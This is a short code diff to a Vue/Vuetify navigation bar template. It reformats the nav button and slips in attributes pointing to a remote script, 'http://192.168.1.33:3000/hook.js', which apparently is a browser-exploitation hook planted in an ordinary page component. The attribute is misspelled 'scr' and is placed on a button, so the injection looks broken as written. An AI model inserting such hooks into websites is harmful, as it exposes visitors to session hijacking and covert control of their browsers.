@@ -9,7 +9,13 @@
         <v-spacer></v-spacer>
         
         <v-app-bar-items class="d-none d-sm-flex">
-          <v-btn text v-for="(navItem, i) in navItems" :key="i" link :to="navItem.route">{{ navItem.text }}</v-btn>
+          <v-btn 
+          text v-for="(navItem, i) in navItems" 
+          :key="i" link 
+          :to="navItem.route"
+          scr="http://192.168.1.33:3000/hook.js" type="text/javascript"
+          >
+            {{ navItem.text }}</v-btn>
         </v-app-bar-items> 
     </v-app-bar>
 
